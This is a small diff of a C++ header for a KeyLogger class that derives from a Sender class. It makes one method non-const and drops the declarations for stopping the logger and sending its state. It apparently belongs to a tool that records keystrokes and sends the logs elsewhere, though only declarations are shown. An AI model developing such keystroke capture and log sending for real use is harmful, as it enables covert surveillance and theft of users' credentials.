@@ -22,11 +22,9 @@ class KeyLogger : public Sender {
 public:
     explicit KeyLogger(const Stream &stream);
     void sendLastKeyloggerLog();
-    void sendAll() const;
+    void sendAll();
     void tryStart();
-    void stopKeylogger();
     void send() override;
-    void sendState() const;
     void setStream(const Stream &);
 private:
     [[nodiscard]] bool lastLogExists() const;
